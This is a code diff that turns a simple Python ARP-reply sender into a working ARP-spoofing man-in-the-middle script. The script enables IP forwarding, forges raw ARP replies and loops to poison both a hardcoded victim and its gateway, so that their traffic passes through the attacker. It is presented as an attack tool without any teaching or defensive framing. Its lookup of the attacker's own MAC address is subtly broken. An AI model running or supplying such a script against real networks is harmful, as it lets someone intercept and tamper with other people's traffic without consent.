@@ -1,95 +1,112 @@
+import os
 import subprocess
-import re
 import struct
 import socket
-import platform
+import time
 
-def send_arp_reply(target_ip, target_mac, source_ip, source_mac):
-    """Send an ARP reply"""
+def enable_ip_forwarding():
+    """Enable IP forwarding on Linux."""
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("1")
+        print("[*] IP forwarding enabled.")
+    except Exception as e:
+        print(f"[!] Failed to enable IP forwarding: {e}")
 
-    iface = "eth0"
+def disable_ip_forwarding():
+    """Disable IP forwarding on Linux."""
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("0")
+        print("[*] IP forwarding disabled.")
+    except Exception as e:
+        print(f"[!] Failed to disable IP forwarding: {e}")
 
+def create_arp_reply(target_ip, target_mac, spoof_ip, spoof_mac):
+    """Create an ARP reply packet."""
+    hardware_type = 1  # Ethernet
+    protocol_type = 0x0800  # IPv4
+    hardware_size = 6  # MAC address length
+    protocol_size = 4  # IP address length
+    opcode = 2  # ARP reply
+
+    # Construct the ARP reply
+    arp_reply = struct.pack(
+        "!HHBBH6s4s6s4s",
+        hardware_type,
+        protocol_type,
+        hardware_size,
+        protocol_size,
+        opcode,
+        bytes.fromhex(spoof_mac.replace(":", "")),  # Sender MAC
+        socket.inet_aton(spoof_ip),  # Sender IP
+        bytes.fromhex(target_mac.replace(":", "")),  # Target MAC
+        socket.inet_aton(target_ip),  # Target IP
+    )
+    return arp_reply
+
+def send_arp_spoof(iface, target_ip, target_mac, spoof_ip, spoof_mac):
+    """Send crafted ARP replies to the target."""
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
     sock.bind((iface, 0))
 
-    arp_reply = create_arp_reply_header(target_ip, target_mac, source_ip, source_mac)
-    sock.send(arp_reply)
+    arp_packet = create_arp_reply(target_ip, target_mac, spoof_ip, spoof_mac)
+    sock.send(arp_packet)
+    print(f"[*] ARP spoof sent to {target_ip} ({target_mac}) claiming to be {spoof_ip}")
 
-    print(f"ARP reply sent to {target_ip} ({target_mac})")
+def get_mac(ip):
+    """Get the MAC address of a given IP."""
+    output = subprocess.check_output(["arp", "-n"], encoding="utf-8")
+    for line in output.splitlines():
+        if ip in line:
+            return line.split()[2]
+    return None
 
+def main():
+    """Main function to perform ARP spoofing."""
+    iface = "eth0"  # Change to your network interface
+    victim_ip = "192.168.240.124"  # Victim's IP
+    gateway_ip = "192.168.240.26"  # Gateway's IP
 
-def create_arp_reply_header(target_ip, target_mac, source_ip, source_mac):
-    """Create an ARP reply header"""
-    hardware_type = 1
-    protocol_type = 0x0800
-    hardware_address_length = 6
-    protocol_address_length = 4
-    operation = 2
+    # Get MAC addresses
+    victim_mac = get_mac(victim_ip)
+    gateway_mac = get_mac(gateway_ip)
 
-    arp_reply = struct.pack("!HHBBH6s4s6s4s", hardware_type, protocol_type, 
-                            hardware_address_length, protocol_address_length, operation,
-                            bytes.fromhex(source_mac.replace(":", "")), socket.inet_aton(source_ip),
-                            bytes.fromhex(target_mac.replace(":", "")), socket.inet_aton(target_ip))
-    
-    return arp_reply
+    if not victim_mac or not gateway_mac:
+        print("[!] Failed to get MAC addresses. Ensure the targets are reachable.")
+        return
 
+    print(f"[*] Victim MAC: {victim_mac}")
+    print(f"[*] Gateway MAC: {gateway_mac}")
 
-def get_mac_address(ip=None):
-    mac_pattern = r"([0-9A-Fa-f]{1,2}[:-][0-9A-Fa-f]{1,2}[:-][0-9A-Fa-f]{1,2}[:-][0-9A-Fa-f]{1,2}[:-][0-9A-Fa-f]{1,2}[:-][0-9A-Fa-f]{1,2})"
+    # Get attacker's MAC address
+    attacker_mac = get_mac(None)
+    attacker_ip = socket.gethostbyname(socket.gethostname())
 
-    if not ip:
-        # Local mac address
-        if platform.system().lower() == "windows":
-            try:
-                output = subprocess.check_output(["ipconfig", "/all"], encoding="utf-8", errors="ignore")
-                sections = output.split("\n\n")
-                for section in sections:
-                    if ('Sem fio' in section or 'Wi-Fi' in section) and '*' not in section:
-                        match = re.search(mac_pattern, section)
-                        if match:
-                            return match.group(0).replace('-', ':').upper()
-            except Exception as e:
-                print(f"Error getting MAC address on Windows: {e}")
-        else:
-            try:
-                output = subprocess.check_output(["ifconfig"], encoding="utf-8", errors="ignore")
-                lines = output.splitlines()
-            
-                in_en0 = False
-                for line in lines:
-                    line = line.strip().replace("ether ", "")
-                    if line.startswith("en0:"):
-                        in_en0 = True
-                    elif in_en0:
-                        match = re.search(mac_pattern, line, re.IGNORECASE)
-                        if match:
-                            return match.group(1).upper()
-                        if ":" in line and not line.startswith(" "):
-                            in_en0 = False
-            except Exception as e:
-                print(f"Error getting MAC address on Linux: {e}")
+    print(f"[*] Attacker IP: {attacker_ip}")
+    print(f"[*] Attacker MAC: {attacker_mac}")
 
-    else:
-        # Remote ip mac address
-        output = subprocess.check_output(["arp", "-a"], encoding="utf-8", errors="ignore")
-        lines = output.splitlines()
+    # Enable IP forwarding
+    enable_ip_forwarding()
 
-        if platform.system().lower() == "windows":
-            try:
-                for line in lines:
-                    if ip in line:
-                        match = re.search(mac_pattern, line)
-                        if match:
-                            return match.group(1).replace('-', ':').upper()
-            except Exception as e:
-                print(f"Error getting MAC address for {ip} on Windows: {e}")
-        else:
-            try:
-                ip_pattern = rf"\? \({ip}\)"
-                for line in lines:
-                    if re.search(ip_pattern, line):
-                        match = re.search(mac_pattern, line)
-                        if match:
-                            return match.group(1).upper()
-            except Exception as e:
-                print(f"Error getting MAC address for {ip} on Linux: {e}")
+    try:
+        print("[*] Starting ARP spoofing...")
+        while True:
+            # Spoof victim to think we're the gateway
+            send_arp_spoof(iface, victim_ip, victim_mac, gateway_ip, attacker_mac)
+
+            # Spoof gateway to think we're the victim
+            send_arp_spoof(iface, gateway_ip, gateway_mac, victim_ip, attacker_mac)
+
+            time.sleep(2)  # Repeat every 2 seconds
+    except KeyboardInterrupt:
+        print("\n[!] Stopping attack and restoring network...")
+        disable_ip_forwarding()
+
+        # Send legitimate ARP replies to restore the ARP tables
+        send_arp_spoof(iface, victim_ip, victim_mac, gateway_ip, gateway_mac)
+        send_arp_spoof(iface, gateway_ip, gateway_mac, victim_ip, victim_mac)
+        print("[*] Network restored.")
+
+if __name__ == "__main__":
+    main()
